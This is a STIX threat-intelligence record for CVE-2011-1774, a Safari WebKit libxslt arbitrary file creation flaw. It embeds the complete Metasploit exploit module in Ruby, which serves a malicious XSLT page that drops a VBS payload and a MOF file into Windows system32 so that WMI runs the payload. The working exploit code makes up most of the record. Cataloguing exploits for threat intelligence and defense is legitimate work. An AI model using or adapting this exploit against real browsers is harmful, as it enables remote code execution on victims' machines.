{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cc946cf5-fc9e-4a44-b1ba-28166b968056",
    "created": "2024-08-14T16:41:10.759497Z",
    "modified": "2024-08-14T16:41:10.759501Z",
    "name": "Apple Safari Webkit libxslt Arbitrary File Creation",
    "description": " This module exploits a file creation vulnerability in the Webkit rendering engine. It is possible to redirect the output of a XSLT transformation to an arbitrary file. The content of the created file must be ASCII or UTF-8. The destination path can be relative or absolute. This module has been tested on Safari and Maxthon. Code execution can be achieved by first uploading the payload to the remote machine in VBS format, and then upload a MOF file, which enables Windows Management Instrumentation service to execute the VBS.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/safari_xslt_output.rb",
            "external_id": "safari_xslt_output.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1774"
        },
        {
            "source_name": "reference",
            "url": "http://lists.apple.com/archives/Security-announce/2011/Jul/msg00002.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Apple Safari Webkit libxslt Arbitrary File Creation',\n      'Description'     => %q{\n          This module exploits a file creation vulnerability in the Webkit\n        rendering engine. It is possible to redirect the output of a XSLT\n        transformation to an arbitrary file. The content of the created file must be\n        ASCII or UTF-8. The destination path can be relative or absolute. This module\n        has been tested on Safari and Maxthon. Code execution can be achieved by first\n        uploading the payload to the remote machine in VBS format, and then upload a MOF\n        file, which enables Windows Management Instrumentation service to execute the VBS.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          => ['Nicolas Gregoire'],\n      'References'      =>\n        [\n          ['CVE', '2011-1774'],\n          ['OSVDB', '74017'],\n          ['URL', 'http://lists.apple.com/archives/Security-announce/2011/Jul/msg00002.html'],\n        ],\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'         =>\n        {\n          'Space' => 2048,\n        },\n      'Platform'        => 'win',\n      'Targets'         =>\n        [\n          #Windows before Vista\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-07-20'))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Check target before attacking\n    agent = request.headers['User-Agent']\n    if agent !~ /Windows NT 5\\.1/ or agent !~ /Safari\\/5/ or agent =~ /Chrome/\n      print_error(\"This target isn't supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    url =  \"http://\"\n    url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    url += \":\" + datastore['SRVPORT'].to_s + get_resource() + \"/\"\n\n    content = <<-EOS\n<?xml-stylesheet type=\"text/xml\" href=\"#fragment\"?>\n<!-- Define the DTD of the document\n   This is needed, in order to later reference the XSLT stylesheet by a #fragment\n   This trick allows to have both the XML and the XSL in the same file\n   Cf. http://scarybeastsecurity.blogspot.com/2011/01/harmless-svg-xslt-curiousity.html -->\n<!DOCTYPE doc [\n <!ATTLIST xsl:stylesheet\n id ID #REQUIRED\n>]>\n<doc>\n\n<!-- Define location and content of the files -->\n<mof>\n  <location><![CDATA[\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\system32\\\\wbem\\\\mof\\\\#{@mof_name}]]></location>\n  <content><![CDATA[#{@mof_content}]]></content>\n</mof><vbs>\n  <location><![CDATA[\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\system32\\\\#{@vbs_name}]]></location>\n  <content><![CDATA[#{@vbs_content}]]></content>\n</vbs>\n\n<!-- The XSLT stylesheet header, including the \"sx\" extension -->\n<xsl:stylesheet id=\"fragment\" version=\"1.0\"\n  xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n  xmlns:sx=\"http://icl.com/saxon\"\n  extension-element-prefixes=\"sx\"\n  xmlns=\"http://www.w3.org/1999/xhtml\" >\n<xsl:output method=\"xml\" indent=\"yes\" />\n\n<!-- The XSLT template -->\n<xsl:template match=\"/\">\n  <!-- Define some XSLT variables -->\n  <xsl:variable name=\"moflocation\" select=\"//mof/location/text()\"/>\n  <xsl:variable name=\"vbslocation\" select=\"//vbs/location/text()\"/>\n  <!-- Create the files -->\n  <sx:output file=\"{$vbslocation}\" method=\"text\">\n    <xsl:value-of select=\"//vbs/content\"/>\n  </sx:output>\n  <sx:output file=\"{$moflocation}\" method=\"text\">\n    <xsl:value-of select=\"//mof/content\"/>\n  </sx:output>\n  <!-- Some output to the browser -->\n  <html> </html>\n</xsl:template>\n</xsl:stylesheet>\n</doc>\n    EOS\n\n    #Clear the extra tabs\n    content = content.gsub(/^ {4}/, '')\n\n    print_status(\"Sending #{self.name}\")\n    send_response(cli, content, {'Content-Type'=>'application/xml'})\n    handler(cli)\n\n  end\n\n  def exploit\n    # In order to save binary data to the file system the payload is written to a VBS\n    # file and execute it from there via a MOF\n    @mof_name = rand_text_alpha(rand(5)+5) + \".mof\"\n    @vbs_name = rand_text_alpha(rand(5)+5) + \".vbs\"\n\n    print_status(\"Encoding payload into vbs...\")\n    payload = generate_payload_exe\n    @vbs_content = Msf::Util::EXE.to_exe_vbs(payload)\n\n    print_status(\"Generating mof file...\")\n    @mof_content = generate_mof(@mof_name, @vbs_name)\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-07-20",
    "x_mitre_platforms": [
        "win'"
    ]
}